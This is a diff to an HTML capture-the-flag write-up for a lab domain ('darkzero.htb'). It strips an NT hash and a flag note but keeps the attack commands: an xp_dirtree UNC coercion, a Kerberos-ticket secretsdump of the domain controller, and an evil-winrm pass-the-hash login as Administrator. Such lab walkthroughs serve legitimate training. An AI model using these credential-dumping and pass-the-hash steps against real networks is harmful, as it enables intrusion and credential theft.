@@ -177,13 +177,13 @@ SQL&gt; xp_dirtree \\DC02.darkzero.ext\C$</code></pre>
 atrox@kali$ export KRB5CCNAME=dc01.ccache
 atrox@kali$ secretsdump.py -k -no-pass DC01.darkzero.htb -just-dc
 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::</code></pre>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:::</code></pre>
 
             <h2>Root Access</h2>
             <p>Accessing DC01 as Administrator:</p>
-            <pre><code>atrox@kali$ evil-winrm -i DC01.darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726
+            <pre><code>atrox@kali$ evil-winrm -i DC01.darkzero.htb -u Administrator -H
 evil-winrm-py PS C:\Users\Administrator\Desktop&gt; cat root.txt</code></pre>
-            <p>🚩 <strong>User and Root flags captured.</strong> [REDACTED]</p>
+            <p>🚩 <strong>User and Root flags captured.</strong></p>
 
             <h2>Attack Path Summary</h2>
             <pre><code>john.w (DC01) 
